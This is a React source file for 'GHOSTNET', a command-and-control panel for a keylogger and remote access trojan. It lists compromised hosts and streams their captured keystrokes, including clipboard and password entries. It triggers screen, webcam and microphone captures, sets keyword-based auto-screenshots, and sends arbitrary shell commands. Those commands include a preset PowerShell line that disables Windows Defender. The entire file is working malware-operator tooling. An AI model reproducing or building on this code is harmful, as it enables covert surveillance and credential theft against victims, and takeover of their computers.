import { useCallback, useEffect, useMemo, useState } from 'react';
import { Bell, Search, Shield, Activity, Image, Crosshair, TerminalSquare, RefreshCw } from 'lucide-react';
import { fetchLatestVersion, proxyFetch, proxySend } from './api.js';

const PAGE_SIZE = 25;

const TABS = [
  { id: 'activity', label: 'LIVE FEED', icon: Activity },
  { id: 'screenshots', label: 'CAPTURES', icon: Image },
  { id: 'triggers', label: 'TRIGGERS', icon: Crosshair },
  { id: 'shell', label: 'SHELL', icon: TerminalSquare }
];

function cx(...parts) { return parts.filter(Boolean).join(' '); }

function formatDate(v) {
  if (!v) return '-';
  const ts = v.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z';
  return new Date(ts).toLocaleString();
}

function relativeTime(v) {
  if (!v) return 'never';
  const diffMin = (Date.now() - new Date(v).getTime()) / 60000;
  if (diffMin < 1) return '0m ago';
  if (diffMin < 60) return `${Math.floor(diffMin)}m ago`;
  const hrs = Math.floor(diffMin / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

function getStatus(lastSeen) {
  if (!lastSeen) return { key: 'offline', color: 'var(--red)' };
  const diffMin = (Date.now() - new Date(lastSeen).getTime()) / 60000;
  if (diffMin < 2) return { key: 'active', color: 'var(--green)' };
  if (diffMin < 5) return { key: 'idle', color: 'var(--amber)' };
  return { key: 'offline', color: 'var(--red)' };
}

function escapeText(s) { return s || ''; }

function isSpam(s) {
  if (!s || s.length <= 5) return false;
  let maxRepeat = 1, cur = 1;
  for (let i = 1; i < s.length; i++) {
    if (s[i] === s[i - 1]) { cur++; maxRepeat = Math.max(maxRepeat, cur); }
    else cur = 1;
  }
  if (maxRepeat >= 5) return true;
  return new Set(s).size / s.length < 0.3;
}

function useAliases() {
  const [aliases, setAliases] = useState(() => {
    try { return JSON.parse(localStorage.getItem('netpen_aliases') || '{}'); } catch { return {}; }
  });
  useEffect(() => {
    localStorage.setItem('netpen_aliases', JSON.stringify(aliases));
  }, [aliases]);
  return [aliases, setAliases];
}

function displayHost(host, aliases) { return aliases[host] || host || '-'; }

function StatusDot({ color }) {
  return <span className="device-dot" style={{ backgroundColor: color, boxShadow: `0 0 6px ${color}` }} />;
}

function Spark({ values }) {
  const max = Math.max(...values, 1);
  return <div className="spark">{values.map((v, i) => <span key={i} style={{ height: `${Math.max(2, (v / max) * 16)}px`, opacity: v > 0 ? .8 : .25 }} />)}</div>;
}

function App() {
  const [tab, setTab] = useState('activity');
  const [aliases, setAliases] = useAliases();
  const [selectedHost, setSelectedHost] = useState('');
  const [globalSearch, setGlobalSearch] = useState('');
  const [windowFilter, setWindowFilter] = useState('');
  const [showSpam, setShowSpam] = useState(false);
  const [page, setPage] = useState(0);
  const [lastPage, setLastPage] = useState(false);
  const [latestVersion, setLatestVersion] = useState(null);
  const [heartbeats, setHeartbeats] = useState([]);
  const [keys, setKeys] = useState([]);
  const [screenshots, setScreenshots] = useState([]);
  const [triggers, setTriggers] = useState([]);
  const [triggerInput, setTriggerInput] = useState('');
  const [shellInput, setShellInput] = useState('');
  const [execResults, setExecResults] = useState([]);
  const [toasts, setToasts] = useState([]);
  const [busy, setBusy] = useState({});
  const [aliasModalHost, setAliasModalHost] = useState('');
  const [aliasDraft, setAliasDraft] = useState('');

  const toast = useCallback((message, type = 'info') => {
    const id = Date.now() + Math.random();
    setToasts((prev) => [...prev, { id, message, type }]);
    setTimeout(() => setToasts((prev) => prev.filter((t) => t.id !== id)), 3000);
  }, []);

  const withBusy = async (key, fn) => {
    try {
      setBusy((prev) => ({ ...prev, [key]: true }));
      await fn();
    } catch (err) {
      toast(`Failed: ${err.message}`, 'error');
    } finally {
      setBusy((prev) => ({ ...prev, [key]: false }));
    }
  };

  const fetchHeartbeat = useCallback(async () => {
    try {
      const data = await proxyFetch('/rest/v1/heartbeat?select=hostname,last_seen,version&order=hostname.asc');
      setHeartbeats(data || []);
    } catch {}
  }, []);

  const fetchActivity = useCallback(async (reset = false) => {
    const activePage = reset ? 0 : page;
    if (reset) setPage(0);
    let path = `/rest/v1/keystrokes?select=created_at,hostname,window_title,keys,version&order=created_at.desc&limit=${PAGE_SIZE}&offset=${activePage * PAGE_SIZE}`;
    if (selectedHost) path += `&hostname=eq.${encodeURIComponent(selectedHost)}`;
    if (windowFilter.trim()) path += `&window_title=ilike.${encodeURIComponent(`*${windowFilter.trim()}*`)}`;
    const data = await proxyFetch(path);
    setKeys(data || []);
    setLastPage(!data || data.length < PAGE_SIZE);
  }, [page, selectedHost, windowFilter]);

  const fetchCaptures = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/control?or=(command.eq.screenshot,command.eq.webcam,command.eq.speaker)&executed=eq.true&order=created_at.desc&limit=50&select=id,created_at,hostname,result_url,command');
    setScreenshots(data || []);
  }, []);

  const fetchTriggers = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/screenshot_triggers?select=id,keyword&order=id.asc');
    setTriggers(data || []);
  }, []);

  const fetchExec = useCallback(async () => {
    const data = await proxyFetch('/rest/v1/exec_results?select=id,created_at,hostname,command,output,exit_code&order=created_at.desc&limit=50');
    setExecResults(data || []);
  }, []);

  const refreshTab = useCallback(() => {
    if (tab === 'activity') return fetchActivity();
    if (tab === 'screenshots') return fetchCaptures();
    if (tab === 'triggers') return fetchTriggers();
    if (tab === 'shell') return fetchExec();
  }, [tab, fetchActivity, fetchCaptures, fetchTriggers, fetchExec]);

  useEffect(() => {
    fetchLatestVersion().then(setLatestVersion).catch(() => {});
    fetchHeartbeat();
    fetchActivity(true).catch(() => {});
    const hb = setInterval(fetchHeartbeat, 10000);
    const refresh = setInterval(() => refreshTab()?.catch?.(() => {}), 20000);
    return () => { clearInterval(hb); clearInterval(refresh); };
  }, []);

  useEffect(() => { refreshTab()?.catch?.(() => {}); }, [tab]);
  useEffect(() => { if (tab === 'activity') fetchActivity().catch(() => {}); }, [page]);
  useEffect(() => {
    const id = setTimeout(() => { if (tab === 'activity') fetchActivity(true).catch(() => {}); }, 300);
    return () => clearTimeout(id);
  }, [selectedHost, windowFilter, showSpam]);

  const agents = useMemo(() => heartbeats.map((row) => {
    const st = getStatus(row.last_seen);
    return {
      id: row.hostname,
      hostname: row.hostname,
      ip: relativeTime(row.last_seen),
      os: row.version != null ? `v${row.version}` : 'v?',
      keystrokeCount: keys.filter((k) => k.hostname === row.hostname).reduce((sum, k) => sum + (k.keys?.length || 0), 0),
      status: st.key,
      color: st.color,
      lastSeen: row.last_seen,
      version: row.version,
      history: keys.filter((k) => k.hostname === row.hostname).slice(0, 12).map((k) => Math.min(15, Math.max(1, (k.keys?.length || 1) / 3)))
    };
  }), [heartbeats, keys]);

  const selectedAgent = agents.find((a) => a.hostname === selectedHost) || null;
  const filteredActivity = useMemo(() => {
    return keys
      .filter((row) => showSpam || !isSpam(row.keys || ''))
      .filter((row) => {
        if (!globalSearch.trim()) return true;
        const q = globalSearch.toLowerCase();
        return `${row.hostname} ${row.window_title} ${row.keys}`.toLowerCase().includes(q);
      });
  }, [keys, showSpam, globalSearch]);

  const scoped = (rows) => selectedHost ? rows.filter((r) => r.hostname === selectedHost) : rows;

  const active = agents.filter((a) => a.status === 'active').length;
  const idle = agents.filter((a) => a.status === 'idle').length;
  const offline = agents.filter((a) => a.status === 'offline').length;
  const totalKeys = heartbeats.length ? heartbeats.reduce((sum, row) => sum + keys.filter((k) => k.hostname === row.hostname).reduce((acc, k) => acc + (k.keys?.length || 0), 0), 0) : 0;

  const ensureHost = () => {
    if (!selectedHost) { toast('Select a device first', 'error'); return false; }
    return true;
  };

  const sendControl = async (command, payload = {}, successMsg = 'Command sent') => {
    if (!ensureHost()) return;
    await proxySend('/rest/v1/control', { command, hostname: selectedHost, executed: false, ...payload });
    toast(successMsg, 'success');
  };

  const updateAlias = () => {
    if (!aliasModalHost) return;
    setAliases((prev) => {
      const next = { ...prev };
      if (aliasDraft.trim()) next[aliasModalHost] = aliasDraft.trim();
      else delete next[aliasModalHost];
      return next;
    });
    setAliasModalHost('');
    setAliasDraft('');
  };

  return (
    <div className="app">
      <header className="topbar">
        <div className="brand">
          <Shield size={16} color="var(--blue)" />
          <span className="brand-title">GHOSTNET</span>
          <span className="brand-sub">// C2 COMMAND CENTER</span>
        </div>
        <div className="top-tabs">
          {TABS.map((item) => {
            const Icon = item.icon;
            return <button key={item.id} className={cx('top-tab', tab === item.id && 'active')} onClick={() => setTab(item.id)}><Icon size={12} style={{ marginRight: 6, verticalAlign: 'middle' }} />{item.label}</button>;
          })}
        </div>
        <div className="top-search">
          <Search size={12} color="var(--text-soft)" />
          <input value={globalSearch} onChange={(e) => setGlobalSearch(e.target.value)} placeholder="Search keystrokes, hosts, windows..." />
        </div>
        <button className="btn btn-red" disabled={busy.stop} onClick={() => withBusy('stop', () => sendControl('stop', {}, `Stop sent to ${selectedHost}`))}>STOP</button>
        <button className="btn btn-red" disabled={busy.selfdestruct} onClick={() => {
          if (!selectedHost) return toast('Select a device first', 'error');
          if (!window.confirm(`Permanently kill the agent on "${selectedHost}"?`)) return;
          withBusy('selfdestruct', () => sendControl('selfdestruct', {}, `Self destruct sent to ${selectedHost}`));
        }}>UNINSTALL</button>
        <button className="btn"><Bell size={14} /></button>
      </header>

      <div className="body">
        <aside className="sidebar">
          <div className="sidebar-header">
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <Activity size={12} color="var(--blue)" />
              <span className="sidebar-title">AGENTS ({agents.length})</span>
            </div>
            <button className="btn" onClick={() => refreshTab()?.catch?.(() => {})}><RefreshCw size={12} /></button>
          </div>
          <div className="device-list">
            {agents.map((agent) => (
              <button key={agent.id} className={cx('device-card', selectedHost === agent.hostname && 'active')} onClick={() => setSelectedHost(agent.hostname)}>
                <div className="device-head">
                  <StatusDot color={agent.color} />
                  <span className="device-name">{displayHost(agent.hostname, aliases)}</span>
                  <span className="device-status" style={{ color: agent.color }}>{agent.status.toUpperCase()}</span>
                </div>
                <div className="device-meta">{relativeTime(agent.lastSeen)} · {agent.os}</div>
                <div className="device-foot">
                  <span className="device-count">{agent.keystrokeCount.toLocaleString()} keys</span>
                  <Spark values={agent.history.length ? agent.history : [0,0,0,0,0,0,0,0,0,0]} />
                </div>
              </button>
            ))}
          </div>
        </aside>

        <main className="main">
          <div className="page-head">
            <div>
              <div className="page-title">{TABS.find((t) => t.id === tab)?.label}</div>
              <div className="tiny muted">Selected device: {selectedHost ? displayHost(selectedHost, aliases) : 'All devices'}</div>
            </div>
            {selectedAgent && (
              <div className="page-actions">
                <span className="badge"><StatusDot color={selectedAgent.color} />{selectedAgent.status.toUpperCase()}</span>
                <span className="badge">{selectedAgent.os}</span>
                <button className="btn" onClick={() => { setAliasModalHost(selectedAgent.hostname); setAliasDraft(aliases[selectedAgent.hostname] || ''); }}>ALIAS</button>
              </div>
            )}
          </div>

          <div className="content">
            {tab === 'activity' && (
              <div className="grid cards-3">
                <div className="panel"><div className="panel-body"><div className="panel-title">VISIBLE ROWS</div><div className="stat-value">{filteredActivity.length}</div></div></div>
                <div className="panel"><div className="panel-body"><div className="panel-title">PAGE</div><div className="stat-value">{page + 1}</div></div></div>
                <div className="panel"><div className="panel-body"><div className="panel-title">LATEST BUILD</div><div className="stat-value">{latestVersion ?? '...'}</div></div></div>

                <div className="panel" style={{ gridColumn: '1 / -1' }}>
                  <div className="panel-header">
                    <span className="panel-title">LIVE KEYSTROKE FEED</span>
                    <div className="filters">
                      <input className="input" value={windowFilter} onChange={(e) => setWindowFilter(e.target.value)} placeholder="Window filter..." />
                      <label className="badge"><input type="checkbox" checked={showSpam} onChange={(e) => setShowSpam(e.target.checked)} /> SHOW SPAM</label>
                    </div>
                  </div>
                  <div className="panel-body">
                    <div className="table-wrap">
                      <table>
                        <thead><tr><th>TIME</th><th>HOST</th><th>WINDOW</th><th>VER</th><th>KEYS</th></tr></thead>
                        <tbody>
                          {filteredActivity.length === 0 ? <tr><td colSpan="5" className="empty">No keystrokes recorded yet.</td></tr> : filteredActivity.map((row, i) => {
                            const isClipboard = row.window_title === '[CLIPBOARD]';
                            const isPassword = (row.window_title || '').startsWith('[PASSWORD]');
                            const verColor = latestVersion != null && row.version != null ? (row.version >= latestVersion ? 'var(--green)' : 'var(--amber)') : 'var(--text-soft)';
                            return <tr key={`${row.created_at}-${row.hostname}-${i}`}>
                              <td>{formatDate(row.created_at)}</td>
                              <td><button className="btn" style={{ padding: '6px 10px' }} onClick={() => { setAliasModalHost(row.hostname); setAliasDraft(aliases[row.hostname] || ''); }}>{displayHost(row.hostname, aliases)}</button></td>
                              <td>{isClipboard ? <span className="badge" style={{ color: 'var(--purple)' }}>Clipboard</span> : isPassword ? <span className="badge" style={{ color: 'var(--red)' }}>Password</span> : row.window_title}</td>
                              <td className="mono" style={{ color: verColor }}>v{row.version ?? '-'}</td>
                              <td className="code">{escapeText(row.keys)}</td>
                            </tr>;
                          })}
                        </tbody>
                      </table>
                    </div>
                    <div className="action-row" style={{ marginTop: 14 }}>
                      <button className="btn" disabled={page === 0} onClick={() => setPage((p) => Math.max(0, p - 1))}>PREVIOUS</button>
                      <button className="btn" disabled={lastPage} onClick={() => setPage((p) => p + 1)}>NEXT</button>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {tab === 'screenshots' && (
              <div className="panel">
                <div className="panel-header">
                  <span className="panel-title">CAPTURE GALLERY</span>
                  <div className="toolbar">
                    <button className="btn btn-blue" disabled={busy.screenshot} onClick={() => withBusy('screenshot', () => sendControl('screenshot', {}, `Screenshot requested from ${selectedHost}`))}>CAPTURE SCREEN</button>
                    <button className="btn btn-purple" disabled={busy.webcam} onClick={() => withBusy('webcam', () => sendControl('webcam', {}, `Webcam requested from ${selectedHost}`))}>CAPTURE WEBCAM</button>
                    <button className="btn btn-amber" disabled={busy.speaker} onClick={() => withBusy('speaker', () => sendControl('speaker', {}, `Speaker requested from ${selectedHost}`))}>CAPTURE SPEAKER</button>
                  </div>
                </div>
                <div className="panel-body">
                  <div className="gallery">
                    {scoped(screenshots).length === 0 ? <div className="empty">No captures yet.</div> : scoped(screenshots).map((row) => {
                      const speaker = row.command === 'speaker';
                      const webcam = row.command === 'webcam';
                      return <div className="capture-card" key={row.id}>
                        {speaker ? <div style={{ height: 200, display: 'flex', alignItems: 'center', justifyContent: 'center' }}><a className="btn btn-amber" href={row.result_url} target="_blank" rel="noreferrer">DOWNLOAD AUDIO</a></div> : <img src={row.result_url} alt={row.command} onClick={() => window.open(row.result_url, '_blank')} />}
                        <div className="capture-meta"><span>{displayHost(row.hostname, aliases)} {webcam ? '(webcam)' : speaker ? '(speaker)' : ''}</span><span>{formatDate(row.created_at)}</span></div>
                      </div>;
                    })}
                  </div>
                </div>
              </div>
            )}

            {tab === 'triggers' && (
              <div className="panel">
                <div className="panel-header">
                  <span className="panel-title">AUTO-SCREENSHOT TRIGGERS</span>
                  <div className="toolbar">
                    <input className="input" value={triggerInput} onChange={(e) => setTriggerInput(e.target.value)} placeholder="Add keyword..." onKeyDown={(e) => e.key === 'Enter' && withBusy('addTrigger', async () => {
                      if (!triggerInput.trim()) return toast('Enter a keyword', 'error');
                      await proxySend('/rest/v1/screenshot_triggers', { keyword: triggerInput.trim().toLowerCase() });
                      setTriggerInput('');
                      await fetchTriggers();
                      toast('Trigger added', 'success');
                    })} />
                    <button className="btn btn-green" onClick={() => withBusy('addTrigger', async () => {
                      if (!triggerInput.trim()) return toast('Enter a keyword', 'error');
                      await proxySend('/rest/v1/screenshot_triggers', { keyword: triggerInput.trim().toLowerCase() });
                      setTriggerInput('');
                      await fetchTriggers();
                      toast('Trigger added', 'success');
                    })}>ADD</button>
                  </div>
                </div>
                <div className="panel-body">
                  <div className="table-wrap"><table><thead><tr><th>KEYWORD</th><th>ACTION</th></tr></thead><tbody>{triggers.length === 0 ? <tr><td colSpan="2" className="empty">No triggers set.</td></tr> : triggers.map((row) => <tr key={row.id}><td className="mono">{row.keyword}</td><td><button className="btn btn-red" onClick={() => withBusy(`del-${row.id}`, async () => { await proxyFetch(`/rest/v1/screenshot_triggers?id=eq.${row.id}`, { method: 'DELETE', headers: {} }); await fetchTriggers(); toast('Trigger deleted', 'success'); })}>DELETE</button></td></tr>)}</tbody></table></div>
                </div>
              </div>
            )}

            {tab === 'shell' && (
              <div className="panel">
                <div className="panel-header"><span className="panel-title">REMOTE SHELL</span></div>
                <div className="panel-body">
                  <div className="toolbar" style={{ marginBottom: 12 }}>
                    <button className="btn btn-red" onClick={() => setShellInput('shutdown /s /t 0')}>SHUTDOWN</button>
                    <button className="btn btn-amber" onClick={() => setShellInput('shutdown /r /t 0')}>RESTART</button>
                    <button className="btn" onClick={() => setShellInput('rundll32.exe user32.dll,LockWorkStation')}>LOCK</button>
                    <button className="btn btn-blue" onClick={() => { const url = window.prompt('Enter URL to open:'); if (url?.trim()) setShellInput(`start "" "${url.trim()}"`); }}>OPEN URL</button>
                    <button className="btn btn-red" onClick={() => setShellInput('powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true"')}>DISABLE DEFENDER</button>
                    <button className="btn" onClick={() => setShellInput('systeminfo | findstr /B /C:"OS Name" /C:"System Boot Time" /C:"Total Physical Memory"')}>SYS INFO</button>
                  </div>
                  <div className="toolbar" style={{ marginBottom: 14 }}>
                    <input className="input" style={{ flex: 1 }} value={shellInput} onChange={(e) => setShellInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && withBusy('exec', async () => { if (!ensureHost() || !shellInput.trim()) return; await sendControl('exec', { payload: shellInput.trim() }, `Exec sent to ${selectedHost}`); setShellInput(''); await fetchExec(); })} placeholder="Enter command..." />
                    <button className="btn btn-blue" disabled={busy.exec} onClick={() => withBusy('exec', async () => { if (!ensureHost() || !shellInput.trim()) return; await sendControl('exec', { payload: shellInput.trim() }, `Exec sent to ${selectedHost}`); setShellInput(''); await fetchExec(); })}>EXECUTE</button>
                  </div>
                  <div className="table-wrap"><table><thead><tr><th>TIME</th><th>HOST</th><th>COMMAND</th><th>OUTPUT</th></tr></thead><tbody>{scoped(execResults).length === 0 ? <tr><td colSpan="4" className="empty">No commands executed yet.</td></tr> : scoped(execResults).map((row) => <tr key={row.id}><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td className="mono">$ {row.command}</td><td><div className="mono tiny" style={{ color: row.exit_code === 0 ? 'var(--green)' : 'var(--red)', marginBottom: 6 }}>exit {row.exit_code}</div><details><summary>toggle output</summary><pre className="code" style={{ whiteSpace: 'pre-wrap' }}>{row.output}</pre></details></td></tr>)}</tbody></table></div>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>

      <footer className="footer">
        <span><StatusDot color="var(--green)" /> ACTIVE {active}</span>
        <span><StatusDot color="var(--amber)" /> IDLE {idle}</span>
        <span><StatusDot color="var(--red)" /> OFFLINE {offline}</span>
        <span>TOTAL KEYS <span style={{ color: 'var(--blue)' }}>{totalKeys.toLocaleString()}</span></span>
      </footer>

      <div className="toast-wrap">{toasts.map((t) => <div key={t.id} className={cx('toast', t.type)}>{t.message}</div>)}</div>

      {aliasModalHost && <div className="modal-backdrop" onClick={() => setAliasModalHost('')}><div className="panel modal" onClick={(e) => e.stopPropagation()}><div className="panel-header"><span className="panel-title">RENAME DEVICE</span></div><div className="panel-body"><div className="muted" style={{ marginBottom: 12 }}>{aliasModalHost}</div><input className="input" style={{ width: '100%' }} value={aliasDraft} onChange={(e) => setAliasDraft(e.target.value)} placeholder="Friendly name..." /><div className="toolbar" style={{ marginTop: 14 }}><button className="btn btn-green" onClick={updateAlias}>SAVE</button><button className="btn" onClick={() => { setAliasModalHost(''); setAliasDraft(''); }}>CANCEL</button></div></div></div></div>}
    </div>
  );
}

export default App;
